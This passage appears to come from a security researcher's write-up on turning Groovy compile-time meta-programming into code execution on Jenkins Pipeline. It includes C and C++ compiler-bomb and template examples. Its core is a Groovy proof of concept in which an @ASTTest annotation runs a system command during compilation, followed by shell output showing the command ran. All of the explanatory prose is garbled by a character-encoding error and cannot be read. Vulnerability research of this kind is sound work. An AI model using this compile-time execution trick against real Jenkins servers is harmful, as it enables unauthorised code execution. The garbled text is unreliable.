&lt;p&gt;Â¶ÇÊûúÈÇÑÊòØÂæàÈõ£ÁêÜËß£Ôºå‰Ω†ÂèØ‰ª•ÊÉ≥ÂÉèÁ®ãÂºèË™ûË®Ä‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; ÂÖ∂ÂØ¶Â∞±ÊòØ‰∏ÄÁ®ÆÂª£Áæ©‰∏äÁöÑ Meta-Programming! ÈõñÁÑ∂‰∏çÁîöÁ≤æÁ¢∫Ôºå‰ΩÜÁî®ÈÄôÂÄãÊØîÂñªÂèØ‰ª•Âø´ÈÄüÁöÑÁêÜËß£ Meta-Programming! ÂÖ∂ÂØ¶Â∞±ÊòØÁî®Á®ãÂºèÁ¢º(eval ÈÄôÂÄãÂáΩÊï∏)ÂéªÁî¢ÁîüÁ®ãÂºèÁ¢º(eval Âá∫‰æÜÁöÑÂáΩÊï∏)! Âú®Á®ãÂºèÈñãÁôº‰∏äÔºåMeta-Programming ‰πüÊúâËëóÊ•µÂÖ∂Â§öÁöÑÊáâÁî®Ôºå‰æãÂ¶Ç:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C Ë™ûË®Ä‰∏≠ÁöÑ Macro&lt;/li&gt;
  &lt;li&gt;C++ ÁöÑ Template&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby Êú¨Ë∫´Â∞±ÊòØ‰∏ÄÈñÄÂ∞á Meta-Programming ÁôºÊèÆÂà∞Ê•µËá¥ÁöÑË™ûË®ÄÔºåÁîöËá≥ÈÇÑÊúâÂ∞àÈñÄÁöÑ&lt;a href=&quot;http://shop.oreilly.com/product/9781934356470.do&quot;&gt;Êõ∏1&lt;/a&gt;, &lt;a href=&quot;http://shop.oreilly.com/product/9781941222126.do&quot;&gt;Êõ∏2&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;Java ÁöÑ Annotation Ë®ªËß£&lt;/li&gt;
  &lt;li&gt;ÂêÑÁ®Æ DSL(Domain Specific Language) ÊáâÁî®Ôºå‰æãÂ¶Ç &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; Âèä &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ËÄåÁï∂ÊàëÂÄëÂú®Ë´áË´ñ Meta-Programming ÊôÇÔºå‰æùÁÖß‰ΩúÁî®ÁöÑÁØÑÂúçÊàëÂÄëÂ§ßËá¥ÂàÜÊàê &lt;strong&gt;(1)Á∑®Ë≠ØÊôÇÊúü&lt;/strong&gt; Âèä &lt;strong&gt;(2)Âü∑Ë°åÊôÇÊúü&lt;/strong&gt;ÈÄôÂÖ©Á®Æ Meta-Programming! ËÄåÊàëÂÄë‰ªäÂ§©ÁöÑÈáçÈªûÔºåÂ∞±ÊòØÂú®Á∑®Ë≠ØÊôÇÊúüÁöÑ Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Êàë‰πü‰∏çÊòØ‰∏Ä‰Ωç Programming Language Â§ßÂ∏´ÔºåÂ¶ÇÊúâ‰∏çÁ≤æÁ¢∫ÊàñËÄÖË¶∫ÂæóÊïôÂ£ûÂ∞èÊúãÂèãÁöÑÂú∞ÊñπÂÜçË´ãÂ§öÂ§öÂåÖÊ∂µ &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Â¶Ç‰ΩïÂà©Áî®&quot;&gt;Â¶Ç‰ΩïÂà©Áî®&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;ÂæûÂâçÈù¢ÁöÑÊÆµËêΩ‰∏≠ÊàëÂÄëÁôºÁèæ Jenkins ‰ΩøÁî® &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(‚Ä¶)&lt;/a&gt; ÂéªÊ™¢Êü•Ë™ûÊ≥ïÈåØË™§ÔºåÊàëÂÄë‰πüÊÉ≥Ëµ∑‰∫Ü Meta-Programming ÂèØÂú®Á∑®Ë≠ØÊôÇÊúüÂ∞çÁ®ãÂºèÁ¢ºÂÅö‰∏Ä‰∫õÂãïÊÖãÁöÑÊìç‰Ωú! Ë®≠Ë®à‰∏ÄÂÄãÁ∑®Ë≠ØÂô®(ÊàñËß£ÊûêÂô®)ÊòØ‰∏Ä‰ª∂ÂæàÈ∫ªÁÖ©ÁöÑ‰∫ãÊÉÖÔºåË£°Èù¢ÊúÉÊúâÂêÑÁ®ÆÈ™ØÈ´íÁöÑÂØ¶‰ΩúÊàñÊòØÂ•áÊÄ™ÁöÑÂäüËÉΩÔºåÊâÄ‰ª•‰∏ÄÂÄãÂæàÁõ¥Ë¶∫ÁöÑÊÉ≥Ê≥ïÂ∞±ÊòØÔºåÊòØÂê¶ÂèØ‰ª•ÈÄèÈÅéÁ∑®Ë≠ØÂô®‰∏Ä‰∫õÂâØ‰ΩúÁî®(Side Effect)ÂéªÂÆåÊàê‰∏Ä‰∫õ‰∫ãÊÉÖÂë¢?&lt;/p&gt;

&lt;p&gt;ËàâÂπæÂÄãÊ∑∫È°ØÊòìÊáÇÁöÑ‰æãÂ≠êÔºåÂ¶Ç C Ë™ûË®ÄÂ∑®ÈõÜÊì¥Â±ïÊâÄÈÄ†ÊàêÁöÑË≥áÊ∫êËÄóÁõ°&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Á∑®Ë≠ØÂô®ÁöÑË≥áÊ∫êËÄóÁõ°(Áî® 18 bytes Áî¢Áîü 16G ÁöÑÂü∑Ë°åÊ™î)&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàñÊòØÁî®Á∑®Ë≠ØÂô®‰æÜÂπ´‰Ω†ÁÆóË≤ªÂºèÊï∏Âàó&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂæûÁµÑÂêàË™ûË®ÄÁöÑÁµêÊûúÂèØ‰ª•ÁúãÂá∫ÈÄô‰∫õÂÄºÂú®Á∑®Ë≠ØÊúüÈñìÂ∞±Ë¢´Ë®àÁÆóÂ•ΩÂ°´ÂÖÖÈÄ≤ÂéªÔºåËÄå‰∏çÊòØÂü∑Ë°åÊúüÈñì!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Êõ¥Â§öÁöÑ‰æãÂ≠ê‰Ω†ÂèØ‰ª•ÂèÉËÄÉ StackOverflow ‰∏äÁöÑ &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; ÈÄôÁØáÊñáÁ´†!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;È¶ñÊ¨°ÂòóË©¶&quot;&gt;È¶ñÊ¨°ÂòóË©¶&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;ÂõûÂà∞ÊàëÂÄëÁöÑÊºèÊ¥ûÂà©Áî®‰∏äÔºåPipeline ÊòØÂü∫Êñº Groovy ‰∏äÁöÑ‰∏ÄÂÄã DSL ÂØ¶‰ΩúÔºåËÄå Groovy ÂâõÂ•ΩÂ∞±ÊòØ‰∏ÄÈñÄÂ∞çÊñº Meta-Programming ÈùûÂ∏∏ÂèãÂñÑÁöÑË™ûË®Ä! ÁøªÈñ±Ëëó Grovvy ÂÆòÊñπÁöÑ &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming ÊâãÂÜä&lt;/a&gt; ÈñãÂßãÂ∞ãÊâæÂêÑÁ®ÆÂèØ‰ª•Âà©Áî®ÁöÑÊñπÊ≥ï! Âú® 2.1.9 Á´†„ÄåÊ∏¨Ë©¶ÂçîÂä©„ÄçÈÄôÂÄãÊÆµËêΩÁôºÁèæ‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; ÈÄôÂÄãË®ªËß£Ôºå‰ªîÁ¥∞ËßÄÂØüÂÆÉÁöÑÊïòËø∞:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer ‚Äúexplore‚Äù the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‰ªÄÈ∫º! ÂèØ‰ª•Âú® AST ‰∏äÂü∑Ë°å‰∏ÄÂÄã assertion? ÈÄô‰∏çÂ∞±ÊòØÊàëÂÄëË¶ÅÁöÑÂóé? Ë∂ïÁ∑äÂÖàÂú®Êú¨Âú∞ÂØ´ÂÄã Proof-of-Concept ÂòóË©¶ÊòØÂê¶ÂèØË°å:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂππÔºåÂèØ‰ª•Ê¨∏! ‰ΩÜ‰ª£Ë™å‰∏¶‰∏çÊòØÊÜ®‰∫∫ÊÉ≥ÁöÑÈÇ£È∫ºÁ∞°ÂñÆ! ÂòóË©¶Âú®ÈÅ†Á´Ø Jenkins ÈáçÁèæÊôÇÔºåÂá∫Áèæ‰∫Ü:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁúüÊòØÈªë‰∫∫ÂïèËôüÔºåÊ£Æ77ÔºåÈÄôÂà∞Â∫ïÊòØ‰∏âÂ∞èÂï¶!!!&lt;/p&gt;

&lt;p&gt;Ë™çÁúüËøΩ‰∫Ü‰∏Ä‰∏ã root cause ÊâçÁôºÁèæÊòØ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; ÈÄôÂÄãÊèí‰ª∂Âú®‰ΩúÊÄ™! ÁÇ∫‰∫ÜÊñπ‰æø‰ΩøÁî®ËÄÖÂèØÈáçË§á‰ΩøÁî®Âú®Á∑®ÂØ´ Pipeline Â∏∏Áî®Âà∞ÁöÑÂäüËÉΩÔºåJenkins Êèê‰æõ‰∫ÜÈÄôÂÄãÊèí‰ª∂ÂèØÂú® Pipeline ‰∏≠ÂºïÂÖ•Ëá™ÂÆöÁæ©ÁöÑÂáΩÂºèÂ∫´! Jenkins ÊúÉÂú®ÊâÄÊúâ Pipeline Âü∑Ë°åÂâçÂºïÂÖ•ÈÄôÂÄãÂáΩÂºèÂ∫´ÔºåËÄåÂú®Á∑®Ë≠ØÊôÇÊúüÁöÑ classPath ‰∏≠‰∏¶Ê≤íÊúâÁõ∏Â∞çÊáâÁöÑÂáΩÂºèÂ∫´Âõ†ËÄåÂ∞éËá¥‰∫ÜÈÄôÂÄãÈåØË™§!&lt;/p&gt;

&lt;p&gt;ÊÉ≥Ëß£Ê±∫ÈÄôÂÄãÂïèÈ°åÂæàÁ∞°ÂñÆÔºåÂà∞ &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; ‰∏≠Â∞á &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; ÁßªÈô§Âç≥ÂèØËß£Ê±∫ÈÄôÂÄãÂïèÈ°å‰∏¶Âü∑Ë°å‰ªªÊÑè‰ª£Á¢º!&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÈÄôÁµïÂ∞ç‰∏çÊòØÊúÄ‰Ω≥Ëß£! ÈÄôÂÄãÊèí‰ª∂ÊúÉÈö®Ëëó Pipeline Ë¢´Ëá™ÂãïÂÆâË£ùÔºåÁÇ∫‰∫ÜË¶ÅÊàêÂäüÂà©Áî®ÈÄôÂÄãÊºèÊ¥ûÈÇÑÂæóÂÖàË¶ÅÊ±ÇÁÆ°ÁêÜÂì°ÊääÂÆÉÁßªÈô§ÂØ¶Âú®Â§™Ë†¢‰∫Ü! Âõ†Ê≠§ÈÄôÊ¢ùË∑ØÂè™ËÉΩÂÖàÊâì‰ΩèÔºåÁπºÁ∫åÂ∞ãÊâæ‰∏ã‰∏ÄÂÄãÊñπÊ≥ï!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂÜçÊ¨°ÂòóË©¶&quot;&gt;ÂÜçÊ¨°ÂòóË©¶&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;ÁπºÁ∫åÈñ±ËÆÄ &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming ÊâãÂÜä&lt;/a&gt;ÔºåÊàëÂÄëÁôºÁèæ‰∫ÜÂè¶‰∏ÄÂÄãÊúâË∂£ÁöÑË®ªËß£ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;ÔºåÈóúÊñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; ÊâãÂÜä‰∏≠‰∏¶Ê≤íÊúâË©≥Á¥∞ÁöÑÊèèËø∞Ôºå‰ΩÜ‰ΩøÁî® Google ÊàëÂÄëÁôºÁèæ‰∫ÜÂè¶‰∏ÄÁØáÊñáÁ´† - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;Âéü‰æÜ Grape(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;) ÊòØ‰∏ÄÂÄã Groovy ÂÖßÂª∫ÁöÑÂãïÊÖã JAR Áõ∏‰æùÊÄßÁÆ°ÁêÜÁ®ãÂºè! ÂèØËÆìÈñãÁôºËÄÖÂãïÊÖãÁöÑÂºïÂÖ•‰∏çÂú® classPath ‰∏äÁöÑÂáΩÂºèÂ∫´! Grape ÁöÑË™ûÊ≥ïÂ¶Ç‰∏ã:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.springframework&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;spring-orm&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;3.2.5.RELEASE&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

